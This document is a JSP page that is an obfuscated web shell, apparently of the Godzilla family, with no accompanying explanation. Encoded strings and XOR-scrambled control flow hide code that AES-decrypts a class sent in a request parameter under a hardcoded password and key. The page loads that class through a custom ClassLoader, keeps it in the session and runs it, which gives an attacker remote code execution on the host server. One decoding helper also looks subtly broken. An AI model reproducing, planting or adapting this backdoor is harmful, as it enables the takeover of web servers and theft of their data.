<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="java.security.Key" %>
<%@ page import="java.security.NoSuchAlgorithmException" %>
<%@ page import="javax.crypto.NoSuchPaddingException" %>
<%@ page import="com.sun.jdi.event.ExceptionEvent" %>
<%@ page import="java.io.UnsupportedEncodingException" %>

<%!

    class index{

        public String XXCPassword;
        public String Password;
        public String Md5Password;
        public String RetPassword = null;

        public javax.crypto.Cipher xds = null;

        {
            try {
                this.xds = javax.crypto.Cipher.getInstance(this.dec("REhW",3));
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            } catch (NoSuchPaddingException e) {
                e.printStackTrace();
            }
        }

        public java.security.MessageDigest Mpassword = null;

        {
            try {
                this.Mpassword = java.security.MessageDigest.getInstance(this.dec("UEc4",3));
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            }
        }

        public Class bencode64;
        public Class bencode65;
        public Class bencode66;
        {
            try {
                this.bencode64 = Class.forName(this.dec("amF2YS51dGlsLkJhc2U2NA==",3));
            } catch (ClassNotFoundException e) {
                try {
                    this.bencode65 = Class.forName(this.dec("c3VuLm1pc2MuQkFTRTY0RW5jb2Rlcg==",3));
                    this.bencode66 = Class.forName(this.dec("c3VuLm1pc2MuQkFTRTY0RGVjb2Rlcg==",3));
                } catch (ClassNotFoundException classNotFoundException) {
                    classNotFoundException.printStackTrace();
                }
                e.printStackTrace();
            }
        }

        public String getMd5() {
            return this.Md5Password;
        }

        public String getPass() {
            return this.Password;
        }

        public String getXc() {
            return this.XXCPassword;
        }

        public void setMd5() {
            this.Md5Password = m5(Password+XXCPassword);
        }

        public void setPass(String pass) {
            this.Password = pass;
        }

        public void setXc(String xc) {
            this.XXCPassword = xc;
        }

        public void Assign(String p1,String p2){
            setXc(p1);
            setPass(p2);
        }

        public String decodeData(String bytes){
            String s = "";
            try {
                sun.misc.BASE64Encoder  b64 = new BASE64Encoder();
                s =  b64.decodeBuffer(bytes);
            }catch (Exception e){
                try {
                    byte[] code = java.util.Base64.getDecoder().decode(bytes.getBytes("utf-8"));
                    s = new String(code);
                } catch (UnsupportedEncodingException ex) {
                    throw new RuntimeException(ex);
                }
            }
            return s;
        }

        public String dec(String str, int offset) {
            try {
                str = decodeData(str);
                char c;
                StringBuilder str1 = new StringBuilder();
                for (int i = 0; i < str.length(); i++) {
                    c = str.charAt(i);
                    if (c >= 'a' && c <= 'z') {
                        c = (char) (((c - 'a') - offset + 26) % 26 + 'a');
                    } else if (c >= 'A' && c <= 'Z') {
                        c = (char) (((c - 'A') - offset + 26) % 26 + 'A');
                    } else if (c >= '0' && c <= '9') {
                        c = (char) (((c - '0') - offset + 10) % 10 + '0');
                    } else {
                        str1 = new StringBuilder(str);
                        break;
                    }
                    str1.append(c);
                }
                String result = str1.toString();
                result = result.replace("\\\"","\"");
                result = result.replace("\\n","\n");
                return result;
            } catch (Exception ignored) {
                return "";
            }
        }

        public byte[] xd(byte[] Spassword,boolean MMMPassword){
            try{
                this.xds.getClass().getMethod(this.dec("bHFsdw==",3),int.class, Key.class).invoke(this.xds,MMMPassword?1:2,(javax.crypto.spec.SecretKeySpec)Class.forName(this.dec("amF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYw==",3)).getConstructor(byte[].class,String.class).newInstance(this.XXCPassword.getBytes(),this.dec("REhW",3)));
                return (byte[]) this.xds.getClass().getMethod(this.dec("Z3JJbHFkbw==",3),byte[].class).invoke(this.xds, Spassword);
            }catch (Exception e){
                return null;
            }
        }

        public String m5(String Spassword){
            try {
                this.Mpassword.getClass().getMethod(this.dec("eHNnZHdo",3), byte[].class,int.class,int.class).invoke(this.Mpassword,Spassword.getBytes(), 0, Spassword.length());
                java.math.BigInteger B = (java.math.BigInteger)Class.forName(this.dec("amF2YS5tYXRoLkJpZ0ludGVnZXI=",3)).getConstructor(int.class,byte[].class).newInstance(1, this.Mpassword.digest());
                this.RetPassword = B.toString(16).toUpperCase(); } catch (Exception e) { }
            return this.RetPassword;
        }

        public String b6e(byte[] BssPassword) {
            String vs = null;
            try {
                vs = (String)this.bencode64.getMethod(this.dec("amh3SHFmcmdodQ==",3), null).invoke(this.bencode64, null).getClass().getMethod(this.dec("aHFmcmdoV3JWd3VscWo=",3), new Class[] { byte[].class }).invoke(this.bencode64.getMethod(this.dec("amh3SHFmcmdodQ==",3), null).invoke(this.bencode64, null), new Object[] { BssPassword });
            } catch (Exception e) {
                try {
                    vs = (String)this.bencode65.newInstance().getClass().getMethod(this.dec("aHFmcmdo",3), new Class[] { byte[].class }).invoke(this.bencode65.newInstance(), new Object[] { BssPassword });
                } catch (Exception e2) { }
            }
            return vs;
        }

        
        public byte[] b6d(String BssPassword) {
            byte[] vs = null;
            try {
                vs = (byte[])this.bencode64.getMethod(this.dec("amh3R2hmcmdodQ==",3), null).invoke(this.bencode64, null).getClass().getMethod(this.dec("Z2hmcmdo",3), new Class[] { String.class }).invoke(this.bencode64.getMethod(this.dec("amh3R2hmcmdodQ==",3), null).invoke(this.bencode64, null), new Object[] { BssPassword });
            } catch (Exception e) {
                try {
                    vs = (byte[])this.bencode66.newInstance().getClass().getMethod(this.dec("Z2hmcmdoRXhpaWh1",3), new Class[] { String.class }).invoke(this.bencode66.newInstance(), new Object[] { BssPassword });
                } catch (Exception e2) {}}
            return vs;
        }
    }

%>
<%!
    class LoaderClass {
        class LoaderClass2{
            class LoaderClass3{
                public ClassLoader Cpassword;
                public byte[] BPW;
                public ClassLoader SettingCpassword(ClassLoader Cpassword){
                    this.Cpassword = Cpassword;
                    return this.Cpassword;
                }

                public byte[] CC(byte[] Bpassword){
                    this.BPW = Bpassword;
                    return BPW;
                }

                 class LoaderClass4{
                    class getClass extends /*asdasdsadsad*/ClassLoader/**/{
                        public Class then;
                        public getClass() {
                            super(Cpassword);
                            then = super.defineClass(BPW,0,BPW.length);
                        }
                    }
                }
            }
        }
    }
%>
<%
    
    String[] globalArr = new String[]{"2|1|0|3|4|6|11|8|5|12","9a955f75d4cef27e","zxchoaichoaciohaicaoscho"};
    String temp = globalArr[(1913238 ^ 1011481) ^ (432471 ^ 1361880)];
    String[] b = temp.split("\\|");
    int subscript = ((4813 ^ 1614917) ^ (381688 ^ 1926256));

    byte[] data = new byte[0];
    Object DC = null;
    java.io.ByteArrayOutputStream OutPut=new java.io.ByteArrayOutputStream();
    index index = new index();
    int start = 0;
    while (subscript != b.length+1){
        start = Integer.parseInt(b[subscript++]);
        switch (start){
            case ((742064 ^ 1861497) ^ (1601269 ^ 1006398)):
                index.Assign(globalArr[(93071 ^ 1493750) ^ (108351 ^ 1443399)],globalArr[(480088 ^ 1200421) ^ (422292 ^ 1274859)]);
                index.setMd5();
                break;
            case ((93071 ^ 1493750) ^ (108351 ^ 1443399)):
                data = (byte[]) index.class.getMethod(index.dec("ZTln",3),String.class).invoke(index,request.getParameter(index.getPass()));
                break;
            case ((4813 ^ 1614917) ^ (381688 ^ 1926256)):
                data = (byte[]) index.class.getMethod(index.dec("YWc=",3),byte[].class,boolean.class).invoke(index,data,false);
                break;
            case ((840786 ^ 1964027) ^ (75706 ^ 1049616)):
                if (session.getAttribute(index.dec("c2Rib3JkZw==",3))==null){
                    LoaderClass loaderClass = new LoaderClass();
                    LoaderClass.LoaderClass2 loaderClass2 = loaderClass.new LoaderClass2();
                    LoaderClass.LoaderClass2.LoaderClass3 loaderClass3 = loaderClass2. new LoaderClass3();
                    loaderClass3.SettingCpassword(this.getClass().getClassLoader());
                    loaderClass3.CC(data);
                    LoaderClass.LoaderClass2.LoaderClass3.LoaderClass4 loaderClass4 = loaderClass3. new LoaderClass4();
                    LoaderClass.LoaderClass2.LoaderClass3.LoaderClass4.getClass getClass = loaderClass4.new getClass();
                    session.setAttribute(index.dec("c2Rib3JkZw==",3),getClass.then);
                    subscript = b.length+1;
                }
                break;
            case ((492345 ^ 1552686) ^ (791819 ^ 1845016)):
                if (session.getAttribute(index.dec("c2Rib3JkZw==",3))!=null){
                    request.setAttribute(index.dec("c2R1ZHBod2h1dg==",3),data);
                }
                break;
            case ((367062 ^ 1943510) ^ (1568013 ^ 1037067)):
                if (session.getAttribute(index.dec("c2Rib3JkZw==",3))!=null){
                    try {
                        DC = ((Class)session.getAttribute(index.dec("c2Rib3JkZw==",3))).newInstance();
                    } catch (InstantiationException e) {
                        e.printStackTrace();
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                break;
            case ((994327 ^ 1996681) ^ (272624 ^ 1405797)):
                if (session.getAttribute(index.dec("c2Rib3JkZw==",3))!=null){
                    DC.equals(OutPut);
                    DC.equals(pageContext); 
                }
                break;
            case ((791991 ^ 1721991) ^ (276318 ^ 1205350)):
                if (session.getAttribute(index.dec("c2Rib3JkZw==",3))!=null){
                    response.getWriter().write(index.getMd5().substring((4813 ^ 1614917) ^ (381688 ^ 1926256),16));
                }
                break;
            case ((660296 ^ 1894086) ^ (864030 ^ 1825429)): 
                if (session.getAttribute(index.dec("c2Rib3JkZw==",3))!=null){
                    DC.toString();
                }
                break;
            case ((314344 ^ 1957918) ^ (171737 ^ 1815843)): 
                if (session.getAttribute(index.dec("c2Rib3JkZw==",3))!=null){
                    try {
                        response.getWriter().write(index.b6e(index.xd(OutPut.toByteArray(), true)));
                        response.getWriter().write(index.getMd5().substring(16));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                break;
        }
    }
%>

